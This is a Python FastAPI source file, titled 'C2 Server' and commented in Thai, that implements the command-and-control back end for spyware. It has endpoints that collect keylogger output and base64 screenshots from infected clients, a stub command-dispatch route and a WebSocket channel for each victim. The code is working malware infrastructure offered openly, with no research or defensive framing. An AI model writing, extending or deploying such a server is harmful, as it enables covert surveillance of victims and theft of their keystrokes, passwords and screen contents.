from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
import logging
import os
from datetime import datetime

# ตั้งค่า Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="C2 Server")

# เปิด CORS ให้ Client เข้าถึงได้
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# เก็บข้อมูล Log ใน Memory (ถ้าต้องการเก็บถาวรให้ใช้ Database เช่น SQLite/MySQL)
keylogs = {}
screenshots = {}
commands = {}

class LogEntry(BaseModel):
    client_id: str
    timestamp: str
    data: str

class CommandRequest(BaseModel):
    client_id: str
    command: str

@app.get("/")
def read_root():
    return {"status": "online", "clients": len(keylogs)}

@app.post("/api/log")
def receive_log(entry: LogEntry):
    """รับข้อมูล Keylogger"""
    if entry.client_id not in keylogs:
        keylogs[entry.client_id] = []
    keylogs[entry.client_id].append({
        "time": entry.timestamp,
        "data": entry.data
    })
    logger.info(f"Log from {entry.client_id}: {entry.data[:50]}...")
    return {"status": "ok"}

@app.post("/api/screenshot")
def receive_screenshot(entry: LogEntry):
    """รับข้อมูลScreenshot"""
    if entry.client_id not in screenshots:
        screenshots[entry.client_id] = []
    screenshots[entry.client_id].append({
        "time": entry.timestamp,
        "data": entry.data # Base64 image string
    })
    return {"status": "ok"}

@app.post("/api/command")
def execute_command(req: CommandRequest):
    """ส่งคำสั่งไป Client (Future feature: WebSocket push)"""
    # ในกรณีนี้ Server ส่งคำสั่งผ่าน WebSocket หรือ HTTP Polling
    return {"status": "command_sent", "client_id": req.client_id}

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"WebSocket from {client_id}: {data}")
            # สามารถส่งคำสั่งกลับไปที่ Client ได้ที่นี่
    except WebSocketDisconnect:
        logger.info(f"Client {client_id} disconnected")
